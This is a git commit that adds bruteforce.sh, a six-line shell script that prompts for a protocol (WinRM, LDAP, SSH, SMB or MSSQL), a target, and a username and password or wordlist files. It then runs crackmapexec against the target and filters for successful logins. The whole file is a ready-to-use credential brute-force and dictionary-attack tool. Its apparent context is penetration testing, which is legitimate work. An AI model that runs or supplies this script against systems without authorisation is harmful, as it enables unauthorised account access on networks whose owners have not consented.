8d4588adcad65efe9a6a2d91eaef0b0f43e6d74c
WisePlace <wiseplaceoff@gmail.com>
2024-04-15 14:35:26 +0200

    Create bruteforce.sh

---
+++ bruteforce.sh
@@ -0,0 +1,6 @@
+# CME #
+read -p "Protocol (winrm/ldap/ssh/smb/mssql): " protocol
+read -p "Target: " target
+read -p "User (Or file path for a dictionnary-based attack): " user
+read -p "Password (Or file path for a dictionnary-based attack): " password
+crackmapexec "$protocol" "$target" -u "$user" -p "$password" | grep "+"
